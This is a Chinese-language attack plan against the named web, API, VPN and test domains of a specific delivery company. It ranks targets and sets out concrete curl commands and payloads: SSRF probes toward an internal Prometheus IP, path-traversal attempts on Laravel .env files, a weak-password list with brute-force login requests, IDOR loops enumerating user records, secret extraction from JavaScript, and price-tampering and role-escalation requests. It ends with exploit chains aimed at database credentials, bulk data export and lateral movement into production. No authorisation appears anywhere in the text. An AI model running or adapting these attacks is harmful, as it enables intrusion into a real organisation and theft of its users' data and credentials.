# 🎯 可利用的攻击点分析

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
## 🔥 高价值可利用点（优先级从高到低）
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

### 1. API开发者文档 (api.ghtk.vn) - ⭐⭐⭐⭐⭐

**可利用方式**:
1. **提取所有API端点和认证方式**
   - 从文档中找到API密钥格式
   - 找到示例请求中的真实Token
   - 分析认证流程，寻找绕过点

2. **测试文档中的示例请求**
   - 直接复制文档中的curl命令
   - 查找是否有测试API Key
   - 测试示例账号/密码

3. **查找内部API端点**
   - 文档可能包含未授权的内部接口
   - 查找admin/debug/test等敏感端点

**下一步行动**:
```bash
# 下载完整文档并深度分析
curl -sk https://api.ghtk.vn/docs > full_docs.html
grep -oE "token|key|secret|password|auth|bearer|api_key" full_docs.html
```

---

### 2. SSRF攻击内网Prometheus - ⭐⭐⭐⭐

**目标**: `10.110.28.141:9090` (Prometheus监控系统)

**可利用方式**:
1. **查找SSRF注入点**
   ```bash
   # 可能存在SSRF的参数
   - url=
   - redirect=
   - proxy=
   - callback=
   - image=
   - file=
   - path=
   ```

2. **测试已知系统的SSRF**
   ```bash
   # admin.giaohangtietkiem.vn
   curl "https://admin.giaohangtietkiem.vn/api/fetch?url=http://10.110.28.141:9090/metrics"
   
   # dashboard.ghtk.vn
   curl "https://dashboard.ghtk.vn/api/image?url=http://10.110.28.141:9090/api/v1/targets"
   
   # inter.ghtk.vn
   curl "https://inter.ghtk.vn/api/proxy?url=http://10.110.28.141:9090/config"
   ```

3. **Prometheus信息泄露**
   - `/metrics` - 系统指标、敏感配置
   - `/api/v1/targets` - 所有监控目标（内网主机列表）
   - `/api/v1/query?query=up` - 查询存活主机
   - `/config` - Prometheus配置文件

**预期收获**:
- 完整内网拓扑
- 所有内部服务地址
- 数据库地址和端口
- 可能的密码/Token

---

### 3. 测试环境弱密码爆破 (ghtklab.com) - ⭐⭐⭐

**目标系统**:
- `chat.ghtklab.com`
- `admin.ghtklab.com`
- `api.ghtklab.com`
- `sos.ghtklab.com`

**可利用方式**:
1. **弱密码字典**
   ```
   admin:admin
   admin:admin123
   admin:ghtk2024
   admin:Ghtk@123
   test:test
   demo:demo
   ghtk:ghtk
   ```

2. **爆破登录接口**
   ```bash
   # 找到登录API
   curl -sk https://admin.ghtklab.com/api/login \
       -d '{"username":"admin","password":"admin123"}'
   ```

3. **K8s API未授权访问**
   - 测试环境K8s API可能开放
   - `https://api.ghtklab.com:6443`
   - `https://api.ghtklab.com:10250`

---

### 4. Laravel .env文件读取 (hrm-api.ghtk.vn) - ⭐⭐⭐

**已知信息**: `/var/www/html/storage/api-docs/`

**可利用方式**:
1. **路径穿越读取.env**
   ```bash
   # 尝试多种编码
   curl "https://hrm-api.ghtk.vn/storage/../.env"
   curl "https://hrm-api.ghtk.vn/storage/..%2f.env"
   curl "https://hrm-api.ghtk.vn/storage/..%252f.env"
   curl "https://hrm-api.ghtk.vn/../.env"
   ```

2. **Nginx配置错误利用**
   ```bash
   curl "https://hrm-api.ghtk.vn/storage../.env"
   curl "https://hrm-api.ghtk.vn/..;/.env"
   ```

3. **Laravel日志文件**
   ```bash
   curl "https://hrm-api.ghtk.vn/storage/logs/laravel.log"
   ```

**预期收获**:
- `APP_KEY` (用于Session伪造/反序列化攻击)
- `DB_HOST`, `DB_USERNAME`, `DB_PASSWORD`
- `REDIS_HOST`, `REDIS_PASSWORD`
- API密钥和第三方服务凭据

---

### 5. VPN暴力破解 (vpn.ghtk.vn) - ⭐⭐

**目标**: `vpn.ghtk.vn` (35.221.247.80)

**可利用方式**:
1. **识别VPN类型后定向攻击**
   - 目前无法访问（连接超时）
   - 需要先确定VPN类型（FortiGate/Pulse Secure/Cisco等）

2. **已知VPN漏洞利用**
   - 如果是FortiGate: CVE-2018-13379 (路径穿越读取密码)
   - 如果是Pulse Secure: CVE-2019-11510 (任意文件读取)

---

### 6. 从JS文件提取API Token - ⭐⭐⭐⭐

**已下载的JS文件**: 11.7MB

**可利用方式**:
1. **深度提取所有密钥**
   ```bash
   # 提取所有Base64编码的字符串
   grep -rEo "['\"][A-Za-z0-9+/=]{40,}['\"]" js_files/ | while read b64; do
       decoded=$(echo "$b64" | tr -d "\"'" | base64 -d 2>/dev/null)
       [ -n "$decoded" ] && echo "$decoded"
   done
   ```

2. **查找硬编码的API Key**
   ```bash
   grep -rE "(api[_-]?key|token)\s*[:=]\s*['\"]([^'\"]{20,})" js_files/ | \
       grep -v "function\|var\|let\|const"
   ```

3. **提取加密算法和密钥**
   - 查找JWT签名密钥
   - 查找AES/RSA加密密钥
   - 分析加密函数逻辑

---

### 7. 业务逻辑漏洞深度挖掘 - ⭐⭐⭐

**可测试的业务逻辑**:
1. **价格篡改**
   ```bash
   # 修改订单金额
   POST /api/order/create
   {"product_id":1, "amount":0.01, "original_price":999.99}
   ```

2. **优惠券/积分滥用**
   ```bash
   # 重复使用优惠券
   POST /api/coupon/apply
   {"coupon_code":"FREE100"}
   # 重复请求多次
   ```

3. **权限提升**
   ```bash
   # 注册时添加role参数
   POST /api/register
   {"username":"test","password":"pass","role":"admin"}
   ```

4. **IDOR（批量枚举）**
   ```bash
   # 枚举所有用户
   for i in {1..10000}; do
       curl "https://admin.giaohangtietkiem.vn/api/user/$i"
   done
   ```

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
## 🎯 利用链组合
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

### 利用链1: API文档 → 真实API Key → 数据导出
```
1. 分析api.ghtk.vn文档
2. 提取示例中的API Key或找到测试账号
3. 使用API Key访问真实数据接口
4. 批量导出敏感数据
```

### 利用链2: SSRF → Prometheus → 内网信息 → 横向移动
```
1. 找到SSRF注入点
2. 访问Prometheus (10.110.28.141:9090)
3. 获取所有内网主机列表
4. 通过SSRF扫描内网服务
5. 攻击内网的Redis/MySQL/K8s API等
```

### 利用链3: Laravel路径泄露 → .env → 数据库密码 → 直接连接
```
1. 路径穿越读取.env文件
2. 获取数据库凭据
3. 直接连接数据库（如果开放外网）
4. 或通过SSRF连接内网数据库
```

### 利用链4: JS逆向 → API Token → 测试环境 → 生产环境横向
```
1. 从JS提取测试环境Token
2. 在ghtklab.com测试环境获取权限
3. 利用测试环境弱点
4. 尝试跳转到生产环境
```

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
## 📋 执行优先级
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

**立即执行（最有可能成功）**:
1. ✅ 深度分析api.ghtk.vn文档，提取API Key/测试账号
2. ✅ 从11.7MB JS文件中深度提取所有密钥
3. ✅ SSRF攻击Prometheus监控系统
4. ✅ Laravel .env文件读取尝试

**中等优先级**:
5. ⏳ 测试环境弱密码爆破
6. ⏳ 业务逻辑深度测试（IDOR/价格篡改等）

**低优先级（需要更多信息）**:
7. ⏸️ VPN暴力破解（需要先能访问）
8. ⏸️ K8s API未授权访问

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
